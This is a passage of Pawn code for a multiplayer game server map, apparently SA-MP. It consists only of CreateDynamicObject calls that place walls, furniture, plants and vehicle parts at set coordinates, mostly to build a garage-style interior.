	CreateDynamicObject(803, 1408.66992, -1704.50195, 13.42780,   0.00000, 0.00000, 71.76003);
	CreateDynamicObject(13591, 1378.31348, -1611.88538, 12.53746,   0.00000, 0.00000, -72.53998);
	CreateDynamicObject(3169, 1708.01611, -1795.36060, 12.49990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3169, 1747.44495, -1756.52393, 12.49993,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3169, 1768.87793, -1755.37646, 12.49993,   0.00000, 0.00000, -180.05995);
	CreateDynamicObject(3169, 1773.95349, -1775.25452, 12.49590,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(9339, 1771.18201, -1755.14343, 12.74975,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 1384.00000, 8657.00000, -1634.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 1647.74817, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(4640, 1664.48438, -1658.78674, 13.92420,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(19425, 1650.97131, -1602.76733, 12.55590,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(10183, 1631.83020, -1630.12000, 12.73000,   0.00000, 0.00000, -44.58000);
	CreateDynamicObject(9339, 840.18591, -2068.06836, 12.24391,   0.00000, 0.00000, 269.93774);
	CreateDynamicObject(9339, 832.36530, -2067.88184, 12.24391,   0.00000, 0.00000, 269.63776);
	CreateDynamicObject(3485, 1361.46375, -1786.68713, 19.31559,   0.00000, 0.00000, 90.70214);
	CreateDynamicObject(9339, 1357.62622, -1801.97046, 13.28343,   0.00000, 0.00000, 269.82388);
	CreateDynamicObject(9339, 1365.69861, -1801.98230, 13.28343,   0.00000, 0.00000, 270.06387);
	CreateDynamicObject(3606, 1360.71716, -1807.89307, 15.95183,   0.00000, 0.00000, -0.54126);
	CreateDynamicObject(9339, 1379.01074, -1814.83435, 13.28343,   0.00000, 0.00000, 360.00391);
	CreateDynamicObject(9339, 1379.10645, -1840.22815, 13.28343,   0.00000, 0.00000, 360.00391);
	CreateDynamicObject(9339, 1379.05396, -1849.39063, 13.28343,   0.00000, 0.00000, 360.00391);
	CreateDynamicObject(9339, 1379.05396, -1849.39063, 13.28343,   0.00000, 0.00000, 360.00391);
	CreateDynamicObject(9339, 1360.51953, -1856.31348, 13.28343,   0.00000, 0.00000, 423.48386);
	CreateDynamicObject(9339, 1346.86487, -1801.93396, 13.28343,   0.00000, 0.00000, 269.82388);
	CreateDynamicObject(640, 1351.89087, -1815.26233, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1351.86316, -1819.76501, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1351.80481, -1825.00183, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1358.05774, -1815.28455, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1358.02356, -1820.33557, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1357.93311, -1825.12537, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1354.77698, -1827.30750, 13.13694,   0.00000, 0.00000, -90.02320);
	CreateDynamicObject(870, 1353.71399, -1825.64526, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1355.91980, -1825.52734, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1354.76428, -1823.52405, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1356.54578, -1823.73755, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1356.24475, -1821.23193, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1353.37854, -1824.19739, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1353.52893, -1821.48914, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1353.54028, -1818.86963, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1355.22412, -1819.69043, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1356.18018, -1817.95398, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1354.68823, -1816.80945, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1353.40381, -1814.33594, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1355.98413, -1814.44641, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1356.25745, -1816.01440, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1353.35046, -1816.48059, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1355.22412, -1819.69043, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1354.90771, -1821.01013, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(620, 1355.64233, -1825.20471, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(620, 1355.58948, -1820.42578, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(620, 1355.42712, -1815.11304, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1363.39258, -1815.11206, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1363.31592, -1819.63184, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1363.31567, -1824.97668, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1369.37488, -1815.11157, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1369.32422, -1820.49280, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1369.28589, -1824.86499, 13.13694,   0.00000, 0.00000, -0.74315);
	CreateDynamicObject(640, 1366.36267, -1827.14941, 13.13694,   0.00000, 0.00000, -90.02320);
	CreateDynamicObject(870, 1364.79749, -1814.41553, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1365.09900, -1819.27551, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1364.82202, -1816.75964, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.00916, -1816.66724, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.77222, -1815.00232, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.77222, -1815.00232, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.24170, -1818.86060, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.49609, -1821.01587, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1365.04797, -1821.11597, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.09326, -1823.09863, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1364.49133, -1823.07166, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1364.62585, -1825.38586, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(870, 1367.22595, -1825.46924, 13.05177,   0.00000, 0.00000, 1.26825);
	CreateDynamicObject(620, 1367.01880, -1825.32227, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(620, 1366.76990, -1820.53613, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(620, 1367.12988, -1815.26477, 12.87271,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1638, 1340.29565, -1804.30908, 13.79348,   0.00000, 0.00000, 359.78262);
	CreateDynamicObject(1638, 1349.88672, -1804.03088, 13.79348,   0.00000, 0.00000, 359.78262);
	CreateDynamicObject(762, 1345.10437, -1809.75049, 12.52993,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1334.31287, -1835.46582, 13.28343,   0.00000, 0.00000, 393.78406);
	CreateDynamicObject(9339, 958.67053, -2155.30493, 12.29170,   0.00000, 0.00000, 356.13388);
	CreateDynamicObject(9339, 965.58972, -2178.50317, 12.29170,   0.00000, 0.00000, 397.05344);
	CreateDynamicObject(9339, 982.30621, -2110.56494, 12.29170,   0.00000, 0.00000, 324.39444);
	CreateDynamicObject(9339, 982.27112, -2198.21240, 12.29170,   0.00000, 0.00000, 403.71344);
	CreateDynamicObject(9339, 1000.24701, -2214.78589, 12.29170,   0.00000, 0.00000, 410.79373);
	CreateDynamicObject(19425, 367.36572, -1752.52039, 13.74754,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 372.12546, -1752.54944, 13.74754,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1494, 361.59555, -1932.73218, 6.98216,   0.00000, 0.00000, -88.14002);
	CreateDynamicObject(3287, 355.03339, -1919.19104, 11.08148,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(12911, 998.50977, -2180.32764, 11.61181,   0.00000, 0.00000, 4.43999);
	CreateDynamicObject(1684, 1000.01324, -2159.00391, 13.53226,   0.00000, 0.00000, -91.07998);
	CreateDynamicObject(10183, 1002.59375, -2132.99292, 12.11396,   0.00000, 0.00000, 310.05304);
	CreateDynamicObject(8168, 961.09119, -2160.69727, 13.88745,   0.00000, 0.00000, 102.49515);
	CreateDynamicObject(8661, 2051.62451, -1912.33337, 12.55610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 2051.62451, -1892.35291, 12.55610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 2051.62671, -1829.53662, 12.54610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8251, 2046.25085, -1876.86462, 16.46560,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3458, 2069.53662, -1902.06006, 14.83210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2071.57349, -1916.98132, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.57349, -1907.34766, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.57349, -1897.71545, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1868.20752, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.57349, -1888.08325, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2066.67236, -1863.30664, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2057.03955, -1863.30664, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2042.35156, -1863.30664, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2036.44641, -1863.30664, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2049.59937, -1863.30664, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2071.57349, -1868.03406, 14.23823,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1874.44397, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1888.70996, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1898.30298, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1907.90601, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2036.62292, -1922.23792, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2031.71802, -1881.56897, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2031.71802, -1917.51233, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2057.22095, -1922.23804, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2066.84619, -1922.23804, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2046.79700, -1884.08972, 16.37230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14411, 2048.63794, -1887.26831, 10.27050,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2046.70972, -1883.30872, 11.71980,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2046.70764, -1880.09485, 11.71980,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2046.79700, -1881.85254, 16.37230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2046.79700, -1879.61475, 16.37230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2046.70972, -1886.52014, 11.71980,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2045.19397, -1888.03235, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2041.80676, -1878.58057, 11.71980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2038.59827, -1878.58057, 11.71980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2035.39075, -1878.58057, 11.71980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2045.67700, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2043.43909, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2041.19763, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2038.95862, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2036.72046, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2034.48145, -1878.49255, 16.37230,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2045.05066, -1883.30872, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.05066, -1880.09485, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2041.55176, -1880.09485, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1880.09485, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1880.09485, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1883.30872, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1883.30872, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2041.55176, -1883.30872, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.04675, -1883.30872, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.04675, -1880.10083, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2041.55176, -1883.30872, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2041.55176, -1880.10083, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1880.10083, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1880.10083, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1883.30872, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1883.30872, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19466, 2046.79700, -1884.08972, 14.43650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2046.79700, -1881.85254, 14.43650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2037.21069, -1884.07678, 16.93210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2045.67700, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2043.43909, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2041.19763, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2036.72046, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2038.95862, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19466, 2034.48145, -1878.49255, 14.43650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2041.57178, -1886.51794, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.04675, -1886.51794, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1886.51794, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1886.51794, 13.37880,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.01794, -1878.58057, 11.71980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2045.05066, -1886.51636, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2041.55176, -1886.51636, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2038.05164, -1886.51636, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2034.70520, -1886.51636, 17.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 2045.19397, -1888.03235, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19443, 2046.71338, -1888.74365, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2041.98364, -1888.03235, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2041.98364, -1888.03235, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2038.77502, -1888.21033, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2038.77502, -1888.21033, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2036.28674, -1888.21033, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2036.28674, -1888.21033, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1078, 2046.86536, -1888.59094, 14.99860,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1421, 2040.80688, -1879.01086, 18.22670,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 2035.25671, -1879.32996, 18.38550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2991, 2045.78845, -1880.49731, 18.14450,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3577, 2038.29724, -1880.32605, 18.23081,   0.00000, 0.00000, 104.40002);
	CreateDynamicObject(944, 2043.17810, -1879.33154, 18.38550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1271, 2046.40100, -1882.91516, 17.84520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1271, 2046.40100, -1883.69739, 17.84520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1271, 2046.40100, -1884.46167, 17.84520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1271, 2046.40100, -1885.24194, 17.84520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1081, 2046.86536, -1888.59094, 16.01270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1082, 2046.86536, -1888.59094, 17.01380,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1074, 2046.86536, -1888.59094, 13.98810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2045.19397, -1885.12256, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2038.77502, -1885.12256, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19370, 2038.77502, -1885.12256, 12.26730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19443, 2043.67883, -1884.23608, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2043.67883, -1884.23608, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3440, 2043.68079, -1883.18005, 14.94950,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2037.28540, -1880.10486, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2046.71338, -1888.74365, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2040.28992, -1885.83679, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2040.28992, -1887.43860, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2040.28992, -1885.83679, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2040.28992, -1887.43860, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2037.25525, -1886.56604, 16.62781,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2037.28540, -1882.50745, 12.26730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, 2046.79700, -1879.61475, 14.43650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2037.28540, -1880.10486, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2037.25525, -1886.56604, 15.02550,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2045.19397, -1885.12256, 15.76240,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19443, 2039.57654, -1880.10486, 12.72800,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2037.25720, -1886.56995, 13.42230,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19370, 2046.47510, -1885.12292, 11.71980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2163, 2046.12708, -1885.00952, 13.46190,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1786, 2045.80957, -1885.04846, 14.36954,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2893, 2033.68091, -1876.88196, 14.37180,   -16.49000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2033.68091, -1875.09143, 14.37180,   -16.49000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2039.48096, -1866.12744, 14.37180,   4.00000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2033.68091, -1866.12744, 14.37180,   -16.49000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2033.67810, -1867.90271, 14.37180,   -16.49000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2039.48096, -1875.09094, 14.37180,   4.00000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2039.48096, -1867.90271, 14.37180,   4.00000, 0.00000, 90.00000);
	CreateDynamicObject(959, 2034.48206, -1872.87048, 13.42820,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(958, 2034.48206, -1872.87048, 13.42820,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(941, 2034.48792, -1870.03223, 13.02080,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19815, 2033.79028, -1869.81116, 14.14175,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(943, 2056.40869, -1865.28857, 13.28250,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(941, 2053.20044, -1865.35205, 12.98772,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19917, 2050.27344, -1865.05627, 14.17980,   0.00000, 0.00000, 269.27997);
	CreateDynamicObject(18633, 2052.49756, -1865.25122, 13.47710,   0.00000, -90.00000, -10.02000);
	CreateDynamicObject(1010, 2052.99829, -1865.39697, 13.46760,   0.00000, 0.00000, 81.42000);
	CreateDynamicObject(2063, 2050.80518, -1865.01038, 13.44190,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19917, 2053.81396, -1865.38647, 13.44380,   0.00000, 0.00000, 105.78000);
	CreateDynamicObject(365, 2051.16626, -1865.05469, 13.87836,   -84.00000, 33.00000, 0.00000);
	CreateDynamicObject(365, 2046.04163, -1863.77551, 13.97071,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(365, 2051.36255, -1865.09766, 13.97071,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2894, 2049.89111, -1865.03015, 13.36810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2972, 2055.49243, -1888.11194, 12.48050,   0.00000, 0.00000, 93.71996);
	CreateDynamicObject(2972, 2056.98291, -1888.09131, 12.48050,   0.00000, 0.00000, 90.83997);
	CreateDynamicObject(2972, 2056.17139, -1888.20007, 13.67290,   0.00000, 0.00000, 85.98000);
	CreateDynamicObject(19627, 2051.39233, -1864.93506, 12.89360,   0.00000, 0.00000, -19.80000);
	CreateDynamicObject(19627, 2051.56885, -1865.01929, 12.89360,   0.00000, 0.00000, 32.22000);
	CreateDynamicObject(19627, 2050.60474, -1865.02026, 12.89360,   0.00000, 0.00000, -88.13998);
	CreateDynamicObject(19627, 2050.38135, -1865.08936, 12.89360,   0.00000, 0.00000, -121.62003);
	CreateDynamicObject(19899, 2048.16382, -1865.09875, 12.52210,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2894, 2048.63013, -1865.09314, 13.77709,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1010, 2047.37891, -1865.25488, 13.77384,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2058.89673, -1890.26868, 13.02278,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2057.58911, -1890.26868, 13.02280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2056.24829, -1890.26868, 13.02280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2056.24829, -1890.26868, 13.97184,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2057.58911, -1890.26868, 13.97180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2058.89673, -1890.26868, 13.97180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2060.25513, -1890.26868, 13.02280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2060.25513, -1888.80750, 13.02280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2060.25513, -1890.26868, 13.97180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3633, 2060.25513, -1888.80750, 13.97180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 2036.67590, -1879.14026, 13.45810,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1723, 2046.28333, -1880.08948, 13.45810,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2010, 2036.67590, -1882.55066, 13.41300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2370, 2043.73279, -1881.50671, 13.36602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2414, 2039.88794, -1882.82422, 13.42520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2414, 2039.88794, -1880.81848, 13.42520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1775, 2040.88403, -1887.34729, 14.57170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2616, 2037.41479, -1879.54150, 15.07766,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2893, 2039.48096, -1876.88196, 14.37180,   4.00000, 0.00000, 90.00000);
	CreateDynamicObject(1514, 2039.90942, -1884.47314, 14.72020,   0.00000, 0.00000, 61.92002);
	CreateDynamicObject(19443, 2037.28540, -1882.50745, 15.76240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2039.57654, -1881.70764, 12.72800,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19443, 2033.88098, -1888.21033, 12.26730,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19443, 2039.57654, -1884.91223, 12.72800,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2414, 2039.88794, -1884.82837, 13.42520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2257, 2037.38892, -1882.03027, 15.07770,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19172, 2043.77222, -1887.94885, 15.23150,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19456, 2071.39697, -1888.08325, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.39697, -1897.71545, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.39697, -1907.34766, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.37744, -1916.98132, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.22095, -1888.08325, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.22095, -1897.71545, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.22095, -1907.34766, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2071.22095, -1916.98132, 14.23820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2066.84619, -1922.06201, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2057.22095, -1922.06201, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2036.62292, -1922.06201, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2066.83911, -1921.86731, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2057.22095, -1921.88599, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2036.62292, -1921.88599, 14.23820,   0.00000, 0.00000, 90.00000);
